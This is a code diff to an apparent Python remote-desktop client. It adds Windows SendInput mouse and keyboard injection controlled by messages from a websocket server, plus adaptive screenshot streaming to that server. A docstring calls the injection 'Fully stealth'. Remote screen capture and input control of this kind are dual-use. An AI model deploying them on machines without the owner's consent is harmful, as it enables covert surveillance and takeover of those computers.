@@ -11,6 +11,221 @@ from io import BytesIO
 from datetime import datetime
 from PIL import Image
 import mss
+import ctypes
+import ctypes.wintypes as wintypes
+
+# ── Win32 API refs ────────────────────────────────────────────────────────────
+_user32 = ctypes.windll.user32
+_SendInput = _user32.SendInput
+_SetCursorPos = _user32.SetCursorPos
+_GetForegroundWindow = _user32.GetForegroundWindow
+
+# ── SendInput Constants ────────────────────────────────────────────────────────
+INPUT_MOUSE = 0
+INPUT_KEYBOARD = 1
+
+# Mouse event flags
+MOUSEEVENTF_MOVE = 0x0001
+MOUSEEVENTF_LEFTDOWN = 0x0002
+MOUSEEVENTF_LEFTUP = 0x0004
+MOUSEEVENTF_RIGHTDOWN = 0x0008
+MOUSEEVENTF_RIGHTUP = 0x0010
+MOUSEEVENTF_MIDDLEDOWN = 0x0020
+MOUSEEVENTF_MIDDLEUP = 0x0040
+MOUSEEVENTF_WHEEL = 0x0800
+MOUSEEVENTF_ABSOLUTE = 0x8000
+
+# Keyboard event flags
+KEYEVENTF_KEYDOWN = 0x0000
+KEYEVENTF_KEYUP = 0x0002
+KEYEVENTF_UNICODE = 0x0004
+
+WHEEL_DELTA = 120
+
+# ── Virtual Key map (key name → VK code) ─────────────────────────────────────
+_VK_MAP = {
+    'enter': 0x0D, 'return': 0x0D, 'backspace': 0x08, 'tab': 0x09,
+    'escape': 0x1B, 'esc': 0x1B, 'space': 0x20, 'delete': 0x2E,
+    'up': 0x26, 'down': 0x28, 'left': 0x25, 'right': 0x27,
+    'home': 0x24, 'end': 0x23, 'pageup': 0x21, 'pagedown': 0x22,
+    'insert': 0x2D, 'capslock': 0x14, 'numlock': 0x90,
+    'ctrl': 0x11, 'ctrlleft': 0xA2, 'ctrlright': 0xA3,
+    'alt': 0x12,  'altleft': 0xA4, 'altright': 0xA5,
+    'shift': 0x10, 'shiftleft': 0xA0, 'shiftright': 0xA1,
+    'win': 0x5B, 'winleft': 0x5B, 'winright': 0x5C,
+    'f1':  0x70, 'f2':  0x71, 'f3':  0x72, 'f4':  0x73,
+    'f5':  0x74, 'f6':  0x75, 'f7':  0x76, 'f8':  0x77,
+    'f9':  0x78, 'f10': 0x79, 'f11': 0x7A, 'f12': 0x7B,
+    'printscreen': 0x2C, 'scrolllock': 0x91, 'pause': 0x13,
+    'volumeup': 0xAF, 'volumedown': 0xAE, 'volumemute': 0xAD,
+}
+
+def _resolve_vk(key: str):
+    """Return VK code for key name or single ASCII char."""
+    k = key.lower().strip()
+    if k in _VK_MAP:
+        return _VK_MAP[k]
+    if len(k) == 1:
+        result = _user32.VkKeyScanW(ord(k))
+        return result & 0xFF if result != -1 else None
+    return None
+
+# ── SendInput Structures ───────────────────────────────────────────────────────
+class MOUSEINPUT(ctypes.Structure):
+    _fields_ = [
+        ("dx", wintypes.LONG),
+        ("dy", wintypes.LONG),
+        ("mouseData", wintypes.DWORD),
+        ("dwFlags", wintypes.DWORD),
+        ("time", wintypes.DWORD),
+        ("dwExtraInfo", ctypes.c_ulonglong),
+    ]
+
+class KEYBDINPUT(ctypes.Structure):
+    _fields_ = [
+        ("wVk", wintypes.WORD),
+        ("wScan", wintypes.WORD),
+        ("dwFlags", wintypes.DWORD),
+        ("time", wintypes.DWORD),
+        ("dwExtraInfo", ctypes.c_ulonglong),
+    ]
+
+class INPUT(ctypes.Union):
+    _fields_ = [
+        ("mi", MOUSEINPUT),
+        ("ki", KEYBDINPUT),
+    ]
+
+class INPUTSTRUCT(ctypes.Structure):
+    _fields_ = [
+        ("type", wintypes.DWORD),
+        ("u", INPUT),
+    ]
+
+def _get_screen_dimensions():
+    """Get primary screen width and height in pixels."""
+    try:
+        import mss
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]  # Primary monitor
+            return monitor['width'], monitor['height']
+    except Exception:
+        # Fallback: use GetSystemMetrics
+        SM_CXSCREEN = 0
+        SM_CYSCREEN = 1
+        width = _user32.GetSystemMetrics(SM_CXSCREEN)
+        height = _user32.GetSystemMetrics(SM_CYSCREEN)
+        return width, height
+
+def _normalize_coords(x: int, y: int) -> tuple:
+    """
+    Convert pixel coordinates to normalized coordinates for SendInput.
+    SendInput expects coordinates in range 0-65535 (virtual desktop coordinates).
+    """
+    screen_width, screen_height = _get_screen_dimensions()
+    
+    # Clamp to screen bounds
+    x = max(0, min(x, screen_width - 1))
+    y = max(0, min(y, screen_height - 1))
+    
+    # Normalize to 0-65535 range
+    norm_x = int((x / screen_width) * 65535)
+    norm_y = int((y / screen_height) * 65535)
+    
+    return norm_x, norm_y
+
+def _send_input_mouse(action: str, x: int = 0, y: int = 0, data: int = 0):
+    """Inject mouse event via SendInput API."""
+    try:
+        mi = MOUSEINPUT()
+        
+        # Normalize coordinates if absolute positioning is used
+        if action == 'move':
+            norm_x, norm_y = _normalize_coords(x, y)
+            mi.dx = norm_x
+            mi.dy = norm_y
+            mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE
+        else:
+            mi.dx = x
+            mi.dy = y
+        
+        mi.mouseData = data
+        mi.time = 0
+        mi.dwExtraInfo = 0
+        
+        if action == 'move':
+            pass  # Already set above
+        elif action == 'leftdown':
+            mi.dwFlags = MOUSEEVENTF_LEFTDOWN
+        elif action == 'leftup':
+            mi.dwFlags = MOUSEEVENTF_LEFTUP
+        elif action == 'rightdown':
+            mi.dwFlags = MOUSEEVENTF_RIGHTDOWN
+        elif action == 'rightup':
+            mi.dwFlags = MOUSEEVENTF_RIGHTUP
+        elif action == 'middledown':
+            mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN
+        elif action == 'middleup':
+            mi.dwFlags = MOUSEEVENTF_MIDDLEUP
+        elif action == 'wheel':
+            mi.dwFlags = MOUSEEVENTF_WHEEL
+            mi.mouseData = data  # Positive for up, negative for down
+        else:
+            return False
+        
+        inp = INPUTSTRUCT()
+        inp.type = INPUT_MOUSE
+        inp.u.mi = mi
+        
+        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
+        return True
+    except Exception as e:
+        print(f"Error in _send_input_mouse: {e}")
+        return False
+
+def _send_input_keyboard(vk: int, is_down: bool):
+    """Inject keyboard event via SendInput API."""
+    try:
+        ki = KEYBDINPUT()
+        ki.wVk = vk
+        ki.wScan = _user32.MapVirtualKeyW(vk, 0)  # MAPVK_VK_TO_VSC
+        ki.dwFlags = KEYEVENTF_KEYDOWN if is_down else KEYEVENTF_KEYUP
+        ki.time = 0
+        ki.dwExtraInfo = 0
+        
+        inp = INPUTSTRUCT()
+        inp.type = INPUT_KEYBOARD
+        inp.u.ki = ki
+        
+        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
+        return True
+    except Exception as e:
+        print(f"Error in _send_input_keyboard: {e}")
+        return False
+
+def _send_input_char(ch: str):
+    """Inject Unicode character via SendInput API."""
+    try:
+        ki = KEYBDINPUT()
+        ki.wVk = 0
+        ki.wScan = ord(ch)
+        ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYDOWN
+        ki.time = 0
+        ki.dwExtraInfo = 0
+        
+        inp = INPUTSTRUCT()
+        inp.type = INPUT_KEYBOARD
+        inp.u.ki = ki
+        
+        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
+        
+        # Release the key
+        ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP
+        _SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUTSTRUCT))
+        return True
+    except Exception as e:
+        print(f"Error in _send_input_char: {e}")
+        return False
 
 class RDPClient:
     def __init__(self, server_url):
@@ -35,18 +250,22 @@ class RDPClient:
             with mss.mss() as sct:
                 monitor = sct.monitors[1]
                 screenshot = sct.grab(monitor)
-                
+
+                screen_w = screenshot.width
+                screen_h = screenshot.height
+
                 img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                 img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
-                
+
                 buffered = BytesIO()
-                img.save(buffered, format="JPEG", quality=40, optimize=True)
-                img_str = base64.b64encode(buffered.getvalue()).decode()
-                
-                return img_str
+                img.save(buffered, format="JPEG", quality=50, optimize=True)
+                img_bytes = buffered.getvalue()
+                img_str   = base64.b64encode(img_bytes).decode()
+
+                return img_str, screen_w, screen_h, img_bytes
         except Exception as e:
             print(f"Error capturing screenshot: {e}")
-            return None
+            return None, 0, 0, None
             
     def get_formatted_time(self):
         """Return formatted time as 'DayName:HH:MM:SS'"""
@@ -297,22 +516,51 @@ class RDPClient:
                 await asyncio.sleep(0.1)
     
     async def send_screenshot_loop(self):
+        """
+        Adaptive real-time streaming:
+        - 20 FPS saat layar aktif berubah
+        - Turun ke 5 FPS saat idle (hemat bandwidth)
+        - Skip frame jika konten identik
+        """
+        MIN_INTERVAL  = 1.0 / 20   # 50ms  → 20 FPS max
+        IDLE_INTERVAL = 1.0 / 5    # 200ms → 5 FPS idle
+        IDLE_AFTER    = 8          # frame tanpa perubahan sebelum masuk idle
+
+        prev_bytes = None
+        idle_count = 0
+
         while self.running:
-            if self.screenshot_active:
-                try:
-                    screenshot = await self.capture_screenshot()
-                    if screenshot and self.websocket:
+            if not self.screenshot_active:
+                await asyncio.sleep(0.1)
+                continue
+
+            t_start = asyncio.get_event_loop().time()
+            try:
+                screenshot, screen_w, screen_h, raw_bytes = await self.capture_screenshot()
+
+                if screenshot and self.websocket:
+                    changed = (prev_bytes is None) or (raw_bytes != prev_bytes)
+
+                    if changed:
+                        idle_count = 0
+                        prev_bytes = raw_bytes
                         await self.websocket.send(json.dumps({
                             'type': 'screenshot',
                             'image': screenshot,
+                            'screen_w': screen_w,
+                            'screen_h': screen_h,
                             'timestamp': datetime.now().isoformat()
                         }))
-                    await asyncio.sleep(self.screenshot_interval)
-                except Exception as e:
-                    print(f"Error in screenshot loop: {e}")
-                    await asyncio.sleep(1)
-            else:
-                await asyncio.sleep(0.5)
+                    else:
+                        idle_count += 1
+
+                elapsed  = asyncio.get_event_loop().time() - t_start
+                interval = IDLE_INTERVAL if idle_count >= IDLE_AFTER else MIN_INTERVAL
+                await asyncio.sleep(max(0.0, interval - elapsed))
+
+            except Exception as e:
+                print(f"Error in screenshot loop: {e}")
+                await asyncio.sleep(1)
                 
     async def handle_commands(self):
         try:
@@ -340,6 +588,12 @@ class RDPClient:
                     await self.command_queue.put(command)
                     print(f"[{timestamp}] [HANDLER] Command queued for processing")
                     
+                elif data['type'] == 'mouse_event':
+                    await self.handle_mouse_event(data)
+
+                elif data['type'] == 'keyboard_event':
+                    await self.handle_keyboard_event(data)
+
                 elif data['type'] == 'file_metadata' or data['type'] == 'file_chunk':
                     # Handle chunked file transfer
                     await self.file_response_queue.put(data)
@@ -353,6 +607,131 @@ class RDPClient:
             self.running = False
             raise
             
+    async def handle_mouse_event(self, data):
+        """
+        Inject mouse event via SendInput API — system-level injection.
+        Fully stealth with absolute positioning.
+        """
+        try:
+            action  = data.get('action')
+            x       = int(data.get('x', 0))
+            y       = int(data.get('y', 0))
+            button  = data.get('button', 'left')
+
+            if action == 'move':
+                # Convert client coordinates to absolute screen coordinates (0-65535 range)
+                _send_input_mouse('move', x, y)
+
+            elif action == 'mousedown':
+                if button == 'left':
+                    _send_input_mouse('leftdown', x, y)
+                elif button == 'right':
+                    _send_input_mouse('rightdown', x, y)
+                else:
+                    _send_input_mouse('middledown', x, y)
+
+            elif action == 'mouseup':
+                if button == 'left':
+                    _send_input_mouse('leftup', x, y)
+                elif button == 'right':
+                    _send_input_mouse('rightup', x, y)
+                else:
+                    _send_input_mouse('middleup', x, y)
+
+            elif action == 'click':
+                if button == 'left':
+                    _send_input_mouse('leftdown', x, y)
+                    _send_input_mouse('leftup', x, y)
+                elif button == 'right':
+                    _send_input_mouse('rightdown', x, y)
+                    _send_input_mouse('rightup', x, y)
+                else:
+                    _send_input_mouse('middledown', x, y)
+                    _send_input_mouse('middleup', x, y)
+
+            elif action == 'double_click':
+                for _ in range(2):
+                    _send_input_mouse('leftdown', x, y)
+                    _send_input_mouse('leftup', x, y)
+                    time.sleep(0.05)  # Small delay between clicks
+
+            elif action == 'scroll':
+                direction = data.get('direction', 'up')
+                clicks    = int(data.get('clicks', 3))
+                delta     = WHEEL_DELTA * clicks * (1 if direction == 'up' else -1)
+                _send_input_mouse('wheel', x, y, delta)
+
+        except Exception as e:
+            timestamp = self.get_formatted_time()
+            print(f"[{timestamp}] [MOUSE] Error: {e}")
+
+    async def handle_keyboard_event(self, data):
+        """
+        Inject keyboard event via SendInput API — system-level injection.
+        Works regardless of focus or foreground window.
+        """
+        try:
+            action = data.get('action')
+            key    = data.get('key', '')
+            text   = data.get('text', '')
+
+            if action == 'keydown':
+                vk = _resolve_vk(key)
+                if vk:
+                    _send_input_keyboard(vk, is_down=True)
+
+            elif action == 'keyup':
+                vk = _resolve_vk(key)
+                if vk:
+                    _send_input_keyboard(vk, is_down=False)
+
+            elif action == 'hotkey':
+                # Urutan: semua modifier down → main key down → semua up
+                keys = data.get('keys', [])
+                if not keys:
+                    return
+                main_key = keys[-1]
+                modifiers = keys[:-1]
+
+                mod_vks = [_resolve_vk(m) for m in modifiers]
+                mod_vks = [v for v in mod_vks if v]
+                main_vk = _resolve_vk(main_key)
+
+                # Send all modifier keys down
+                for vk in mod_vks:
+                    _send_input_keyboard(vk, is_down=True)
+                    time.sleep(0.01)
+
+                # Send main key down
+                if main_vk:
+                    _send_input_keyboard(main_vk, is_down=True)
+                    time.sleep(0.01)
+                    _send_input_keyboard(main_vk, is_down=False)
+                    time.sleep(0.01)
+
+                # Release all modifier keys
+                for vk in reversed(mod_vks):
+                    _send_input_keyboard(vk, is_down=False)
+                    time.sleep(0.01)
+
+            elif action == 'typewrite':
+                # Send each character via Unicode input
+                for ch in text:
+                    _send_input_char(ch)
+                    time.sleep(0.02)  # Small delay between characters
+
+        except Exception as e:
+            timestamp = self.get_formatted_time()
+            print(f"[{timestamp}] [KEYBOARD] Error: {e}")
+
+    def _get_focused_hwnd(self):
+        """
+        Get the foreground window handle.
+        Note: With SendInput, we don't need this anymore since SendInput works
+        at system level without needing window focus.
+        """
+        return _GetForegroundWindow()
+
     async def connect(self):
         try:
             async with websockets.connect(self.server_url) as websocket:
